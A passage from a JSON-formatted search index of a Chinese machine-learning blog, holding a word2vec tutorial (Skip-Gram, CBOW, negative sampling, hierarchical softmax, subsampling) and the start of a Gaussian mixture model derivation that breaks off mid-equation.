Onehot vs 分布式表示 CBOW和skip gram Huffman改进 负采样","text":"本文主要介绍大名鼎鼎的“word2vec”。word2vec顾名思义，就是将词表示为一个向量，表示出的向量可以运用在各种各样的任务上。可以说，在BERT等模型诞生前，这个词向量的表示方法是最为流行的方法之一。 本文主要包括： Onehot vs 分布式表示 CBOW和skip gram Huffman改进 负采样 为什么要分布式表示 在做NLP的时候，对于词最简单的处理方法就是对词编号，然后把每个词表示为One-hot向量。更具体的说，给定V个词，我们可以按照字典序进行排序，下标0~V-1对应着每个不同的词。而One-hot向量一个\\(V \\times 1\\)维的向量，对于下标为a的词，其的向量中下标a为1，其余均为0。 可以看出，One-hot向量的维度和词库的大小成正比，得到的是十分稀疏的向量（因为只有一个位置为1，其余都为0)。 此外，这种One-hot的向量表示几乎没有表达语义信息的能力。因为任何两个词之间都是正交的，我们常常使用的余弦距离结果都是0，这也与实际情况不相符，往往我们会有近义词、反义词等关系。 因此，就要让我们今天的主角word2vec来解决这些问题啦~ word2vec是一种词的embedding方法，在介绍之前，首先了解一下啥叫embedding呢？ 参考知乎用户寒蝉鸣泣的解答： Embedding在数学上表示一个mapping, f: X -&gt; Y， 也就是一个function，其中该函数是injective（就是我们所说的单射函数，每个Y只有唯一的X对应，反之亦然）和structure-preserving (结构保存，比如在X所属的空间上X1 &lt; X2,那么映射后在Y所属空间上同理 Y1 &lt; Y2)。那么对于word embedding，就是将单词word映射到另外一个空间，其中这个映射具有injective和structure-preserving的特点。 通俗的翻译可以认为是单词嵌入，就是把X所属空间的单词映射为到Y空间的多维向量，那么该多维向量相当于嵌入到Y所属空间中，一个萝卜一个坑。 word embedding，就是找到一个映射或者函数，生成在一个新的空间上的表达，该表达就是word representation。 在Word2vec中，每个词向量都会表示为K维的稠密向量，这样一来，达到了降维的效果。此外，word2vec假设具有相同上下文的词语包含相似的语义，使得学习到的词向量映射到欧式空间后有较高的余弦相似度，更符合实际的表示。 Fake Task 我们想要得到的是词的向量，而在训练word2vec的时候，其实目标并不是得到词的向量，词的向量其实只是学习到的“副产品”。 那么目标是什么呢？真正训练的目标是：给定一个词，计算当这个词出现时，它临近的其它词出现的概率。这里的“临近”指的是设置一个窗口大小，比如将窗口大小设置为2，意味着该词的前2个和后2个单词会纳入训练样本中，下图就是一个例子： word2vec-fake-target 比如fox出现的时候，我们想知道quick词出现的概率。 我们把给定的词称为“中心词”，临近词称为“背景词”。比如上图最后一个例子，fox为中心词，而比如quick等词就称为背景词。 这种给定中心词计算背景词的方法称为Skip-Gram模型, 假设给定中心词的情况下背景词独立，上图最后一个例子可以用条件概率表示为： \\[ P(\\textrm{quick},\\textrm{brown},\\textrm{jumps},\\textrm{over}\\mid\\textrm{fox}) = P(\\textrm{quick}\\mid\\textrm{fox})\\cdot P(\\textrm{brown}\\mid\\textrm{fox})\\cdot P(\\textrm{jumps}\\mid\\textrm{fox})\\cdot P(\\textrm{over}\\mid\\textrm{fox}) \\] 还有另外一种给定临近词计算中心词概率的方法，称为CBOW模型，同样可以用条件概率表示为： \\[ P(\\textrm{fox} \\mid\\textrm{quick},\\textrm{brown},\\textrm{jumps},\\textrm{over}) \\] 可以先记住下面很直观的图（左边为CBOW，右边为Skip-Gram）： word2vec-cbow-skip-gram-overview 下面就详细的介绍这两个算法。 Skip-Gram 上面提到，Skip-Gram是用中心词去预测背景词的。给定长度为T的文本序列，窗口大小为m，上述所说的预测概率过程可用极大似然估计表示为: \\[ \\prod_{t=1}^{T} \\prod_{-m \\leq j \\leq m,\\ j \\neq 0} P(w^{(t+j)} \\mid w^{(t)})\\tag{3-1} \\] 而该目标与最小化负对数似然函数等价： \\[ - \\sum_{t=1}^{T} \\sum_{-m \\leq j \\leq m,\\ j \\neq 0} \\text{log}\\, P(w^{(t+j)} \\mid w^{(t)})\\tag{3-2} \\] 要是知道概率P的形式，我们可以用梯度下降的方式进行训练，那么概率P是什么呢？先来看看Skip-Gram的网络结构： word2vec-skip-gram 这是一层的神经网络，输入是one-hot后的向量\\(\\bf x\\)。假设词库大小为V，对该中心词进行编号，如果该词编号为k，则\\(x_k = 1\\)，其它位置都为0，维度为\\(V \\times 1\\)。 然后是矩阵\\(\\bf W\\)，维度为\\(V \\times N\\)，则输入到隐层的操作其实是矩阵的相乘，\\({\\bf v_k} = {\\bf W^T x} = {\\bf W_k^T}\\), 即相乘后其实得到的是矩阵\\(\\bf W^T\\)中的第k列（称为\\(\\bf v_k\\))，其维度为\\(N \\times 1\\)。 从隐层到输出层则是另一个矩阵\\(\\bf W&#39;\\)，这个矩阵维度为\\(N \\times V\\)，设\\(t_{c,j} = {\\bf v_k^T u_j }\\)，其中\\({\\bf u_j}\\)为\\(\\bf W&#39;\\)的第j列(\\(N \\times 1\\))，结果得到一个数\\(u_{c,j}\\)。这里\\(u_{c,j}\\)代表输出的第c个面板的第j个单词的值（因为要输出C个结果）。然后我们可以放入Softmax进行概率归一化： \\[ p(w_{c,j} = w_{O,c}|w_I) = \\hat{y}_{c,j} = \\frac{\\exp(t_{c,j})}{\\sum_{a=1}^{V} \\exp(t_{c,a})}\\tag{3-3} \\] 其中，\\(w_{c,j}\\)为第c个背景词输出向量的第j个单词的值，而\\(w_{O,c}\\)为背景词中的第c个单词，\\(w_I\\)为输入的单词。合起来就是说给定单词\\(w_I\\)，第c个背景词为第j个词的概率。 但其实隐层到输出层的权重矩阵\\(\\bf W&#39;\\)是共享的，\\(t_j = t_{c,j} = {\\bf v_k^Tu_j }\\)，因此可以看成C个背景词分别进行前向传播, 模型简化如下： word2vec-skip-gram2 公式也可以简化为： \\[ p(w_j|w_i) =\\frac{\\exp(t_{j})}{\\sum_{a=1}^{V} \\exp(t_k)} = \\frac{\\exp({\\bf v_i^T u_j})}{\\sum_{a=1}^{V} \\exp({\\bf v_i^T u_a})} \\tag{3-4} \\] 注意到\\(\\bf v_i\\)和\\(\\bf u_j\\)是两个词\\(w_i\\)和和\\(w_j\\)的词向量，前者来自矩阵\\(\\bf W\\)， 后者来自矩阵\\(\\bf W&#39;\\)。 因此，对于skip-gram模型来说，计算 \\(P(\\textrm{quick}\\mid\\textrm{fox})\\) 时输入的为fox的one-hot向量，y则为quick单词one-hot向量，其它的\\(P(\\textrm{jumps}\\mid\\textrm{fox})\\), \\(P(\\textrm{over}\\mid\\textrm{fox})\\)同理。这样就相当于计算了共现的概率，可以用反向传播来学习。 学习结束后，可以选择\\(\\bf W\\)或者矩阵\\(\\bf W&#39;\\)作为我们的词向量矩阵，比如选择\\(\\bf W&#39;\\)，则每一列就是我们对应单词的embedding后的结果。 训练 假设我们采用随机梯度下降进行训练，即每次只选取一个中心词（假设编号为i）来计算梯度，则损失函数为： \\[ \\mathcal{L} = -\\sum_{-m \\leq j \\leq m,\\ j \\neq 0} \\text{log}\\, P(w^{(i+j)} \\mid w^{(i)})\\tag{3-5} \\] 这里首先对式3-4取对数为： \\[ \\log p(w_j|w_i) = {\\bf v_i^T u_j} - \\log{\\sum_{a=1}^{V} \\exp({\\bf v_i^T u_a})} \\tag{3-6} \\] 而式3-6对\\(\\bf v_i\\)梯度为 \\[ \\begin{aligned} \\frac{\\partial \\text{log}\\, P(w_j \\mid w_i)}{\\partial \\bf{v}_i} &amp;= {\\bf u_j} - \\frac{\\sum_{b=1}^{V} \\exp({\\bf v_i^T u_b}){\\bf u_b}}{\\sum_{a=1}^{V} \\exp({\\bf v_i^T u_a})}\\\\ &amp;= {\\bf u_j} - \\sum_{b=1}^{V}\\frac{\\exp({\\bf v_i^T u_b})}{\\sum_{a=1}^{V}\\exp({\\bf v_i^T u_a})} {\\bf u_b} \\\\ &amp;= {\\bf u_j} - \\sum_{b=1}^{V} P(w_b \\mid w_i) {\\bf u_b} \\end{aligned}\\tag{3-7} \\] 同理对\\(u_j\\)的梯度为 \\[ \\begin{aligned} \\frac{\\partial \\text{log}\\, P(w_j \\mid w_i)}{\\partial \\bf{u}_j} &amp;= {\\bf v_i} - \\frac{\\exp({\\bf v_i^T u_j}){\\bf v_i}}{\\sum_{a=1}^{V} \\exp({\\bf v_i^T u_a})}\\\\ &amp;= {\\bf v_i} - P(w_j \\mid w_i) {\\bf v_i} \\end{aligned}\\tag{3-8} \\] 3-5的式子其实也可以看成是交叉熵损失，标签y为one-hot的结果，则 \\[ L({\\bf W}) = - \\sum_{-m \\leq j \\leq m,\\ j \\neq 0} \\sum_{a=1}^V y_a^{(i+j)} \\log P(w^{(i+j)} \\mid w^{(i)})\\tag{3-9} \\] 但每个\\(\\bf y^{(i+j)}\\)中只有一个为1，其余的为0，因此最后就和3-5等价了。 CBOW 模型 CBOW(continuous bag-of-word)即连续词袋模型，即用一个中心词前后距离d内的背景词来预测该中心词出现的概率。 为了方便理解，再把上面的例子的条件概率抄下来： \\[ P(\\textrm{fox} \\mid\\textrm{quick},\\textrm{brown},\\textrm{jumps},\\textrm{over}) \\] 更一般的，给定长度为T的文本序列，设窗口大小为m, 可以用似然函数表示为： \\[ \\prod_{t=1}^{T} P(w^{(t)} \\mid w^{(t-m)}, \\ldots, w^{(t-1)}, w^{(t+1)}, \\ldots, w^{(t+m)}) \\tag{4-1} \\] 同样的，我们先来看看网络结构，然后再讨论P的形式。 CBOW模型可以用如下的一层神经网络表示： word2vec-cbow 和Skip-gram类似，首先对背景词都进行one-hot处理，每个背景词都得到对应的one-hot向量\\(\\bf x\\)，然后每个背景词的向量\\(\\bf x\\)都和矩阵\\(\\bf W\\)相乘，然后求和取平均，公式如下： \\[ {\\bf \\bar v} = \\frac{1}{C} \\sum_{i=1}^{C}{\\bf W^T x^{(i)}} = \\frac{1}{C} \\sum_{i=1}^{C}{\\bf v_{i}}\\tag{4-2} \\] 这里的C等于2m,即我们滑动窗口的两倍。 从隐层到输出层和之前的类似，和另一个矩阵\\(\\bf W&#39;\\)相乘，这里假设中心词下标为j，有\\(t_j = {\\bf v^T u_j }\\)，其中\\({\\bf u_j}\\)为\\(\\bf W&#39;\\)的第j列(\\(N \\times 1\\))，结果得到一个数\\(u_k\\)。然后放入Softmax进行概率归一化： \\[ p(w_j|w_1,\\dots,w_C) = y_j = \\frac{\\exp({\\bf {\\bar v}^T u_j })}{\\sum_{k = 1}^{V}\\exp({\\bf {\\bar v}^T u_k})}\\tag{4-3} \\] 训练 和Skip-gram类似，最大化似然等价于最小化负的对数似然： \\[ \\mathcal{L} =- \\sum_{t=1}^{T} \\log P(w^{(t)} \\mid w^{(t-m)}, \\ldots, w^{(t-1)}, w^{(t+1)}, \\ldots, w^{(t+m)})\\tag{4-4} \\] 4-3取对数得： \\[ \\log P(w_j|w_1,\\dots,w_C) = {\\bf {\\bar v}^T u_j } - \\log{\\sum_{k = 1}^{V}\\exp({\\bf{\\bar v}^T u_k}})\\tag{4-3} \\] 4-3对中心词向量\\(\\bf u_j\\)求导得： \\[ \\begin{aligned} \\frac{\\partial \\text{log}\\, P}{\\partial \\bf{u}_j} &amp;= {\\bf {\\bar v}} - \\frac{\\exp({\\bf {\\bar v}^T u_j}){\\bf {\\bar v}}}{\\sum_{a=1}^{V} \\exp({\\bf {\\bar v}^T u_a})}\\\\ &amp;= {\\bf {\\bar v}} - P(w_j|w_1,\\dots,w_C) {\\bf {\\bar v}} \\end{aligned}\\tag{4-4} \\] 对于任意的背景词向量\\(\\bf v_i\\)，4-3对其求导有： \\[ \\begin{aligned} \\frac{\\partial \\text{log}\\, P}{\\partial \\bf{v}_i} &amp;= \\frac{1}{C} {\\bf u_j} - \\frac{\\sum_{b=1}^{V}\\exp({\\bf {\\bar v}^T u_b})\\frac{1}{C} {\\bf u_b} }{\\sum_{a=1}^{V} \\exp({\\bf {\\bar v}^T u_a})}\\\\ &amp;= \\frac{1}{C} \\left({\\bf u_j} - \\sum_{b=1}^VP(w_b|w_1,\\dots,w_C) {\\bf u_b} \\right) \\end{aligned}\\tag{4-5} \\] 加速计算 可以看出计算Softmax的时候，需要计算求和项，（在计算梯度的时候也要计算求和项），而计算求和项的复杂度是\\(O(V)\\)级的，即和词库大小挂钩，对于较大的词库，开销会比较大。 为此，有两种技术来加速这个过程。下面以Skip-Gram模型为例来讲解两种优化的技术。 负采样 negative sampling 负采样（negative sampling）其实是将原来的多分类训练方法转化为二分类，即给定\\(w_c\\)和\\(w_i\\)两个词，\\(w_i\\)在\\(w_c\\)窗口内的概率。 如何训练呢？我们需要进行采样得到正例和负例。所谓的正例和负例就是神经网络输出的结果分别为1和0。 以之前的The quick brown fox jumps over the lazy dog例子来说， 正例：即中心词\\(w_c\\)和窗口范围内每个背景词\\(w_i\\)分别组成的pair就是正例。（和之前的一样） 负例：用相同的中心词\\(w_c\\)，然后在词库中随机抽取k个词，中心词和这k个词分别组成pair，得到的k个pair都标记为负例。这里的k一般取5~20。这里有个小细节，比如我的中心词是fox，窗口大小为2，但是我从词库中抽取的词是brown，在该句子中其实是在fox前面的，但是仍然算作负例。 还有另外一个细节是负样本的选择，考虑我们在词库中进行随机的取词，我们希望取词组成的样本对比较具有代表性，这样训练出的效果会比较好，考虑两种简单的取词方案： 如果用均等的概率选择的话，其实对于英文的文本是没有代表性的。 如果用出现的频率来取词，像\"the\"这些stop words的采样得到的概率会很大，但是(\"fox\", \"the\") 并不能告诉我们很多的信息，因为the这个单词在很多上下文都出现过。 因此，word2vec采用了一种tradeoff的方式，即和频率不完全挂钩： \\[ P(w_i) = \\frac{ {f(w_i)}^{3/4} }{\\sum_{j=0}^{n}\\left( {f(w_j)}^{3/4} \\right) }\\tag{4-6} \\] 其中，\\(f(w_i)\\)是单词\\(w_i\\)的频率，\\(3/4\\)是经验值。 负采样的公式表示 上面提到，负采样将原来的多分类转化为了二分类问题，因此避免了Softmax分母求和项的计算。下面用公式形式化的说明这一过程。(主要参考《动手学深度学习》的内容) 负采样考虑一对词 \\(w_c\\) 和 \\(w_o\\) 是不是可能组成中心词和背景词对，即 \\(w_o\\) 是否可能出现在 \\(w_c\\) 的背景窗口里。我们假设会出现在窗口的概率为： \\[ P(D=1\\mid w_c, w_o) = \\sigma({\\bf v_c^T u_o}) = \\frac{1}{1+e^{-{\\bf v_c^T u_o}}}\\tag{4-7} \\] 给定一个长度为T的文本序列，窗口大小为m，则我们可以用极大似然估计来学习： \\[ \\prod_{t=1}^{T} \\prod_{-m \\leq j \\leq m,\\ j \\neq 0} \\mathbb{P}(D=1\\mid w^{(t)}, w^{(t+j)})\\tag{4-8} \\] 但这个模型里只有正例样本，我们可以让所有词向量相等且值为无穷大，这样上面概率等于最大值 1，我们可以加入负例样本来使得目标函数更有意义。在负采样中，我们为每个中心词和背景词对根据分布 \\(P(w)\\)采样 K 个没有出现在背景窗口的的词，它们被称为噪音词，并最大化它们不出现的概率。而分布\\(P(w)\\)就是上面的公式4-6。 这样，我们得到下面目标函数： \\[ \\prod_{t=1}^{T} \\prod_{-m \\leq j \\leq m,\\ j \\neq 0} \\left(\\mathbb{P}(D=1\\mid w^{(t)}, w^{(t+j)})\\prod_{k=1,\\ w_k \\sim \\mathbb{P}(w)}^K \\mathbb{P}(D=0\\mid w^{(t)}, w_k)\\right)\\tag{4-9} \\] 记词\\(w^{(t)}\\)的所因为\\(i_t\\)，则最大化上面目标函数等价于最小化它的负对数值： \\[ - \\sum_{t=1}^{T} \\sum_{-m \\leq j \\leq m,\\ j \\neq 0} \\left(\\log\\, \\sigma(\\boldsymbol{v_{i_{t}}}^\\top \\boldsymbol{u_{i_{t+j}}}) + \\sum_{k=1,\\ w_k \\sim \\mathbb{P}(w)}^K \\log\\left(1-\\sigma(\\boldsymbol{v_{i_t}}^\\top \\boldsymbol{u_{k}})\\right)\\right)\\tag{4-9} \\] 层次 Softmax 层次Softmax（Hierarchical Softmax ）是另外一种加速训练的方法，它相对负采样的方法来说比较复杂。 层次Softmax采用的是Huffman树，首先统计语料中词语的词频，然后根据词频来构建Huffman树。 下图是一个例子，树的根节点可以理解为输入词的词向量，每个叶子节点代表着词典中的一个单词，中间节点仅仅是辅助作用，没什么实际的含义。 word2vec-hierarchical-softmax 假设\\(L(W)\\)为二叉树的根节点到词\\(w\\)的叶子节点的路径上的节点数（包括根和叶子节点），设\\(n(w,j)\\)为该路径上第\\(j\\)个节点，并设该节点的背景词向量为\\(\\mathbf{u}_{n(w,j)}\\)。以上图为例，\\(L(w_3) = 4\\)，层次Softmax将skip-gram模型中的条件概率近似表示为： \\[ \\mathbb{P}(w_o \\mid w_c) = \\prod_{j=1}^{L(w_o)-1} \\sigma\\left( [\\![ n(w_o, j+1) = \\text{leftChild}(n(w_o,j)) ]\\!] \\cdot \\mathbf{v}_c^\\top \\mathbf{u}_{n(w_o,j)} \\right)\\tag{4-10} \\] 其中，\\(\\sigma\\)表示sigmoid函数，\\([\\![ n(w_o, j+1) = \\text{leftChild}(n(w_o,j)) ]\\!]\\)表示的是如果第j + 1个结点是第j个结点的左儿子的话，则值为1，否则为-1。这相当于每次决定结点向左还是向右走是一个二分类问题。 举个例子，计算给定中心词\\(w_c\\)后，\\(w_3\\)的条件概率，根据式4-10，要将路径上的概率练成起来： \\[ \\mathbb{P}(w_3 \\mid w_c) = \\sigma(\\mathbf{v}_c^\\top \\mathbf{u}_{n(w_3,1)}) \\cdot \\sigma(-\\mathbf{v}_c^\\top \\mathbf{u}_{n(w_3,2)}) \\cdot \\sigma(\\mathbf{v}_c^\\top \\mathbf{u}_{n(w_3,3)} ) \\] 可以看出,这开销和路径的长度是有很大的关系的, 因此实际中采用的是Huffman树，进行不等长编码，频率越高的词越接近根节点，这使计算量有所降低。这样加快了速度。 此外，由于输出层不使用one-hot来表示，Softmax回归就不需要对那么多0（也即负样本）进行拟合，仅仅只需要拟合输出值在Huffman树中的一条路径。假设词表大小为V，一条路径上节点的个数可以用\\(O(log_2|V|)\\)来估计，就是说只需要拟合\\(O(log_2|V|)\\)次，这给计算量带来了指数级的减少。 注意到\\(\\sigma(x) + \\sigma(-x) = 1\\)，给定中心词\\(w_c\\)生成词典中任一词的条件概率之和为1这一条件也满足： \\[ \\sum_{w \\in \\mathcal{V}} \\mathbb{P}(w \\mid w_c) = 1 \\] 欠采样 subsample 负采样的方式通过考虑同时含有正例样本和负例样本的相互独立事件来构造损失函数,其训练中每一步的梯度计算开销与采样的负例个数线性相关. 层次Softmax使用了Huffman树,并根据根节点到叶子结点的路径来构造损失函数,其训练中每一步的梯度计算开销与词典大小对数相关. 其实除了上面提到的负采样和层次Softmax来提升训练速度外，训练过程中还有欠采样（subsample）的方式。 一些词如\"the\"等stop words，这些词并不包含多少语义，而且出现的频率特别高，如果不加处理会影响词向量的效果。欠采样就是为了应对这种现象，它的主要思想是对每个词都计算一个采样概率，根据概率值来判断一个词是否应该保留。在语料库或者说训练集中的每个词，如果计算出该词不被保留，那么我们就将该词删除。 概率计算方法为： \\[ p(word) = \\left(\\sqrt{\\frac{f(word)}{0.001}+1}\\right) \\cdot\\frac{0.001}{f(word)} \\] 其中f(word)表示word出现的概率，0.001为默认值。 word2vec-subsample-func 可以看出，词语出现的概率越高，其被采样到的概率就越低。这里有一点IDF的味道，不同的是IDF是为了降低词的特征权重，欠采样是为了降低词的采样概率。 CBOW 和 Skip-gram对比 上面提到的word2vec有两种计算方法，CBOW和Skip-gram，那么他们谁更好呢？ 从速度上说，CBOW训练更快。考虑窗口大小为2，那么CBOW需要计算的是4个one-hot向量分别乘以\\(\\bf W\\)矩阵，然后计算均值。实际上我们可以直接选取\\(\\bf W^T\\)的列出来，然后计算均值。接着计算和\\(\\bf W\\)矩阵乘积，最后反向传播，这样总开销为1次前向传播和1次反向传播。而Skip-gram则需要分别计算4个词的正向传播和反向传播，和窗口大小成正比。所以说CBOW模型速度更快。 但是Skip-gram对于低频词更准确。Stack exchange有一个很好的解释： In CBOW the vectors from the context words are averaged before predicting the center word. In skip-gram there is no averaging of embedding vectors. It seems like the model can learn better representations for the rare words when their vectors are not averaged with the other context words in the process of making the predictions. As we know, CBOW is learning to predict the word by the context. Or maximize the probability of the target word by looking at the context. And this happens to be a problem for rare words. For example, given the context yesterday was really [...] day CBOW model will tell you that most probably the word is beautiful or nice. Words like delightful will get much less attention of the model, because it is designed to predict the most probable word. Rare words will be smoothed over a lot of examples with more frequent words. On the other hand, the skip-gram is designed to predict the context. Given the word delightful it must understand it and tell us, that there is huge probability, the context is yesterday was really [...] day, or some other relevant context. With skip-gram the word delightful will not try to compete with word beautiful but instead, delightful+context pairs will be treated as new observations. Because of this, skip-gram will need more data so it will learn to understand even rare words. from https://stats.stackexchange.com/a/261440 相对而言，skip-gram用得更多一点。 关于在大数据集上用哪个模型stack overflow上有帖子讨论：word2vec: CBOW &amp; skip-gram performance wrt training dataset size 参考资料 Word2Vec Tutorial - The Skip-Gram Model 词嵌入（word2vec） Mikolov T, Sutskever I, Chen K, et al. Distributed representations of words and phrases and their compositionality[C]//Advances in neural information processing systems. 2013: 3111-3119. 漫谈Word2vec之skip-gram模型 Meyer D. How exactly does word2vec work?[J]. 2016. DeepLearning.ai 吴恩达 第五课第二周， 自然语言处理与词嵌入","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Deep Learning","slug":"Deep-Learning","permalink":"https://www.hrwhisper.me/tags/Deep-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』高斯混合模型(GMM)","slug":"machine-learning-guassian-mixed-model","date":"2018-12-01T11:26:11.000Z","updated":"2020-10-19T14:35:48.803Z","comments":true,"path":"machine-learning-guassian-mixed-model/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-guassian-mixed-model/","excerpt":"高斯混合模型（Guassian Mixed Model, 简称GMM）是一种常见的聚类方法，与K-means类似，同样使用了EM算法进行迭代计算。","text":"高斯混合模型（Guassian Mixed Model, 简称GMM）是一种常见的聚类方法，与K-means类似，同样使用了EM算法进行迭代计算。 高斯混合模型 高斯混合模型假设每个簇的数据都是符合高斯分布的，当前数据呈现的分布就是各个簇的高斯分布叠加在一起的结果。于是高斯混合模型采用线性组合来对数据分布进行拟合，理论上高斯混合模型可以拟合出任意类型的分布。 具体的，我们想要将数据分为K个簇（cluster），可以假设不同簇中的样本各自服从不同的高斯分布，K个簇就有K个高斯分布，将K个高斯分布加起来就得到了GMM模型。对于每一个高斯模型，其均值\\(\\mu_k\\)和方差\\(\\sigma_k\\)都是待估计的参数，此外，每个模型还有一个参数\\(\\alpha_k\\)，表示该模型的权重，该参数满足\\(\\sum_{k=1}^K \\alpha_k =1\\)。 \\[ \\begin{align*} p(x) &amp;=\\sum_{k=1}^K P(k)P(x\\mid k)\\\\ &amp;=\\sum_{k=1}^K\\alpha_k \\mathcal{N}({x}\\mid{\\mu}_k,{\\sigma}_k)\\tag{2-1}\\\\ \\end{align*} \\] 其中， \\[ \\begin{align*} \\mathcal{N}({\\bf x}\\mid{\\mu}_k,{\\sigma}_k) = \\frac{1}{\\sigma_k\\sqrt{2\\pi}} \\exp\\left(-\\frac{(x-\\mu_k)^2}{2\\sigma_k^2}\\right) \\\\ \\sum_{k=1}^K \\alpha_k=1 \\end{align*} \\] 若\\(\\bf x\\)为向量，则可以写成： \\[ \\begin{align*} p({\\bf x}) &amp;= \\sum_{k=1}^K\\alpha_k \\mathcal{N}({\\bf x}\\mid{\\bf \\mu}_k,{\\bf \\Sigma}_k)\\\\ \\mathcal{N}({\\bf x}\\mid{\\bf \\mu}_k,{\\bf \\Sigma}_k) &amp;= \\frac{1}{\\sqrt{(2\\pi)^K|\\Sigma_k|}} \\exp\\left(-\\frac{1}{2}({\\bf x} - {\\bf \\mu}_k)^T\\Sigma_k^{-1}({\\bf x} - {\\bf \\mu_k})\\right) \\\\ \\sum_{k=1}^K \\alpha_k&amp;=1 \\end{align*} \\] 为了方便讲解，下面我们采用非向量的方式进行讲解。 高斯混合模型是一个生成式的模型，数据可以看成是从多个高斯分布生成出来的。具体的说，对于一个样本，按照概率\\(\\alpha_k\\)选择第k个分布，然后从第k分布\\(\\mathcal{N}({x}\\mid{\\mu}_k,{\\sigma}_k)\\)生成数据x。 在实际中，我们已知的是样本点，要来估计上面提到的参数\\(\\alpha_k, \\ \\mu_k, \\ \\bf \\sigma_k\\), 假设我们采用极大似然法，可以写出对数似然函数如下： \\[ l = \\sum_{i=1}^N \\log P(x_i) = \\sum_{i=1}^N \\log \\left(\\sum_{k=1}^K \\alpha_k \\mathcal{N}({x}_i\\mid{\\mu}_k,{\\sigma}_k) \\right) \\tag{2-2} \\] 这是一个复杂的非凸函数。对于每个观测数据点来说，事先并不知道它是属于哪个子分布的（hidden variable）。此外，\\(\\log P\\)中的\\(P\\)里面还有求和项， K 个高斯模型的和不是一个高斯模型，对于每个子模型都有未知的, \\(\\alpha_k, \\ \\mu_k, \\ \\bf \\sigma_k\\)直接求导无法计算，需要通过迭代的方法求解。 因此，求解高斯混合模型采用的是EM算法： E-step： 根据当前的参数，计算每个点由某个分模型生成的概率 M-step：使用E步估计出的概率，来改进每个分模型的\\(\\alpha_k, \\ \\mu_k, \\ \\bf \\sigma_k\\) 高斯分布和K-means都需要指定K值，都是用EM算法来求解，同时往往也只能收敛到局部最优。它比K-means更优的地方在于： 可以给出一个样本属于某个类的概率是多少 除了聚类外，还可以用于概率密度的估计 可以用于生成新的样本点 求解推导 本小节主要是推导EM算法中的E-step和M-step 引入隐变量 首先对式2-1做一下变换，引入一个服从多项分布的随机变量\\(\\bf z\\)，简单的说\\(\\bf z\\)就是一个One-hot的向量: \\[ z_{k} = \\begin{cases} 1，&amp;\\text{样本来自第k个分模型} \\\\ 0, &amp;\\text{否则} \\end{cases} \\] 假设\\(z_k\\)之间是独立同分布的，则容易写出联合概率： \\[ p({\\bf z}) = p(z_1) p(z_2)...p(z_K) = \\prod_{k=1}^K \\alpha_k^{z_k} \\tag{2-2} \\] 则给定\\(\\bf z\\)之后，可以求出\\(P(x \\mid z)\\)(相当于选择第k个分布)： \\[ p(x\\mid {\\bf z}) = \\prod_{k=1}^K \\mathcal{N}({\\bf x}\\mid{\\mu}_k,{\\bf \\sigma}_k)^{z_k} \\tag{2-3} \\] 于是可以根据联合概率求出： \\[ \\begin{align*} p({\\bf x}) &amp;= \\sum_z p(z)p(x\\mid z)\\\\ &amp;= \\sum_{k=1}^K\\alpha_k \\mathcal{N}({\\bf x}\\mid{\\mu}_k,{\\bf \\Sigma}_k) \\tag{2-4} \\end{align*} \\] 2-4是忽略了\\(z_k=0\\)的项，因为值为1。可以发现和2-1等价。 这样，我们引入了隐变量\\(\\bf z\\)，用来描述样本是由第j个高斯分布产生的。 E-step 在EM算法中，我们提到E-step求的Q函数形式为\\(P(z \\mid x)\\)，对于GMM模型来说，我们可以用贝叶斯公式求出\\(p(z_k = 1 \\mid x)\\)： \\[ \\begin{align*} \\gamma(z_k) = P(z_k=1\\mid x) &amp;= \\frac{P(x, z_k=1)}{P(x)} \\\\ &amp;= \\frac{P(x\\mid z_k =1)P(z_k =1)}{P(x)}\\\\ &amp;= \\frac{\\alpha_k \\mathcal{N}({\\bf x}\\mid{\\mu}_k,{\\bf \\Sigma}_k)}{\\sum_{j=1}^K\\alpha_j \\mathcal{N}({\\bf x}\\mid{\\mu}_j,{\\bf \\Sigma}_j)} \\tag{2-5} \\end{align*} \\] M-Step 现在我们知道了2-5的形式，就可以求导来优化\\(\\mu\\)等参数了。回顾一下对数似然函数2-2： \\[ l = \\sum_{i=1}^N \\log P(x_i) = \\sum_{i=1}^N \\log \\left(\\sum_{k=1}^K \\alpha_k \\mathcal{N}({x}_i\\mid{\\mu}_k,{\\sigma}_k) \\right) \\tag{2-2} \\] 2-2对\\(\\mu_k\\)求导，并令导数为0，有 \\[ \\begin{align*} \\frac{\\partial l}{\\partial \\mu_k} &amp;= \\sum_{i=1}^N \\frac{\\alpha_k \\frac{\\partial \\mathcal{N}({x}_k\\mid{\\mu}_k,{\\sigma}_k)}{\\partial \\mu_k}}{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)}\\\\ &amp;=\\sum_{i=1}^N \\frac{\\alpha_k \\frac{1}{\\sigma_k\\sqrt{2\\pi}} \\exp\\left(-\\frac{(x_i-\\mu_k)^2}{2\\sigma_k^2}\\right) (\\frac{1}{\\sigma_k^2}(x_i-\\mu_k)(-1)) }{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)}\\\\ &amp;= -\\sum_{i=1}^N \\frac{\\alpha_k \\mathcal{N}({x}_i\\mid{\\mu}_k,{\\sigma}_k) }{\\sum_{j=1}^K \\alpha_j \\mathcal{N}({x}_i\\mid{\\mu}_j,{\\sigma}_j)} \\frac{x_i-\\mu_k}{\\sigma_k^2}\\\\ &amp;= -\\sum_{i=1}^N \\gamma(z_{ik})\\frac{x_i-\\mu_k}{\\sigma_k^2} = 0 \\end{align*} \\] 得： \\[ \\mu_k = \\frac{\\sum_{i=1}^N \\gamma(z_{ik})\\ x_i}{\\sum_{i=1}^N \\gamma(z_{ik})} \\] 2-2对\\(\\sigma_k\\)求导有： \\[ \\begin{align*} \\frac{\\partial l}{\\partial \\sigma_k} &amp;= \\sum_{i=1}^N \\frac{\\alpha_k \\frac{\\partial \\mathcal{N}({x}_k\\mid{\\mu}_k,{\\sigma}_k)}{\\partial \\sigma_k}}{\\sum_{j=1}^K \\alpha_j 